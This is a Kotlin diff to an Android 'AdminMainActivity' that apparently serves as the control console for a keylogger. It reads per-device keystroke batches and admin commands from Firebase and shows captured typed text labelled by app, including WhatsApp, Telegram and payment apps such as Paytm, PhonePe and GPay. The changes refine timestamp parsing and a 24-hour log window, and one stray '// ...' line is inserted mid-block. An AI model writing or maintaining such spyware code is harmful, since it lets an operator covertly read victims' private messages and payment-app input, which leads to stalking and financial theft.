@@ -138,6 +138,36 @@ class AdminMainActivity : AppCompatActivity() {
         }
     }
 
+    private fun parseTimestamp(value: Any?): Long? {
+        val raw = when (value) {
+            is Long -> value
+            is Number -> value.toLong()
+            is String -> value.toLongOrNull()
+            else -> null
+        } ?: return null
+
+        // Convert Unix timestamps in seconds to milliseconds automatically
+        return if (raw in 1..10000000000L) raw * 1000L else raw
+    }
+
+    private fun getPrettyAppName(pkg: String): String {
+        val cleanPkg = pkg.removePrefix("accessibility_").removePrefix("notification_")
+        return when {
+            cleanPkg.contains("whatsapp", true) -> "WhatsApp"
+            cleanPkg.contains("paytm", true) -> "Paytm"
+            cleanPkg.contains("phonepe", true) -> "PhonePe"
+            cleanPkg.contains("paisa", true) -> "GPay"
+            cleanPkg.contains("navi", true) -> "Navi"
+            cleanPkg.contains("chrome", true) -> "Chrome"
+            cleanPkg.contains("youtube", true) -> "YouTube"
+            cleanPkg.contains("instagram", true) -> "Instagram"
+            cleanPkg.contains("dialer", true) -> "Phone"
+            cleanPkg.contains("telegram", true) -> "Telegram"
+            cleanPkg.contains("settings", true) -> "Settings"
+            else -> cleanPkg.substringAfterLast('.')
+        }
+    }
+
     private fun loadConnectedDevices() {
         if (devicesListener != null && devicesRef != null) {
             devicesRef?.removeEventListener(devicesListener!!)
@@ -148,7 +178,7 @@ class AdminMainActivity : AppCompatActivity() {
             override fun onDataChange(snapshot: DataSnapshot) {
                 var totalEntriesCount = 0
                 val now = System.currentTimeMillis()
-                val cutoff24h = now - (24 * 60 * 60 * 1000L)
+                val cutoff24h = now - (24L * 60L * 60L * 1000L) // Exactly 24 hours back from this moment
                 var maxLastSeen = 0L
 
                 for (child in snapshot.children) {
@@ -222,15 +252,6 @@ class AdminMainActivity : AppCompatActivity() {
         devicesRef?.addValueEventListener(devicesListener!!)
     }
 
-    private fun parseTimestamp(value: Any?): Long? {
-        return when (value) {
-            is Long -> value
-            is Number -> value.toLong()
-            is String -> value.toLongOrNull()
-            else -> null
-        }
-    }
-
     private fun listenToDeviceState(deviceName: String) {
         val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
         
@@ -271,29 +292,13 @@ class AdminMainActivity : AppCompatActivity() {
         })
     }
 
-    private fun getPrettyAppName(pkg: String): String {
-        return when {
-            pkg.contains("whatsapp", true) -> "WhatsApp"
-            pkg.contains("paytm", true) -> "Paytm"
-            pkg.contains("phonepe", true) -> "PhonePe"
-            pkg.contains("paisa", true) -> "GPay"
-            pkg.contains("navi", true) -> "Navi"
-            pkg.contains("chrome", true) -> "Chrome"
-            pkg.contains("youtube", true) -> "YouTube"
-            pkg.contains("instagram", true) -> "Instagram"
-            pkg.contains("dialer", true) -> "Phone"
-            pkg.contains("telegram", true) -> "Telegram"
-            pkg.contains("settings", true) -> "Settings"
-            else -> pkg.substringAfterLast('.')
-        }
-    }
-
     private fun listenToDeviceLogs(deviceName: String) {
         val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val entries = mutableListOf<Triple<Long, String, String>>()
-                val cutoff24h = System.currentTimeMillis() - (24 * 60 * 60 * 1000L)
+                val now = System.currentTimeMillis()
+                val cutoff24h = now - (24L * 60L * 60L * 1000L) // Exactly 24 hours back from this moment (e.g. 24h window)
 
                 for (appChild in snapshot.children) {
                     val rawApp = appChild.key ?: continue
@@ -305,10 +310,10 @@ class AdminMainActivity : AppCompatActivity() {
                             ?: entry.child("typedContent").getValue(String::class.java)
                             ?: continue
 
-                        val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: System.currentTimeMillis()
+                        val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: now
 
-                        // Load only last 24 hour logs to prevent lag and optimize memory
-                        if (timestampMillis >= cutoff24h && text.isNotBlank() && text != "null") {
+                        // Load strictly within the last 24 hours (from now to 24h back)
+                        if (timestampMillis >= cutoff24h && timestampMillis <= now && text.isNotBlank() && text != "null") {
                             entries.add(Triple(timestampMillis, prettyApp, text))
                         }
                     }
@@ -361,7 +366,7 @@ class AdminMainActivity : AppCompatActivity() {
 
             // Update subtitle and expandable content visibility based on isExpanded state
             if (device.isExpanded) {
-                holder.txtDeviceSub.text = "Active Node // Expanded (24h Logs)"
+                holder.txtDeviceSub.text = "Active Node // Expanded (Last 24h Logs)"
                 holder.layoutExpandableContent.visibility = View.VISIBLE
             } else {
                 holder.txtDeviceSub.text = "Active Node // Tap to Expand Logs"
@@ -498,6 +503,7 @@ class AdminMainActivity : AppCompatActivity() {
                     layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1f - percent)
                 }
 
+    // ...
                 barContainer.addView(fillView)
                 barContainer.addView(emptyView)
                 rowLayout.addView(barContainer)
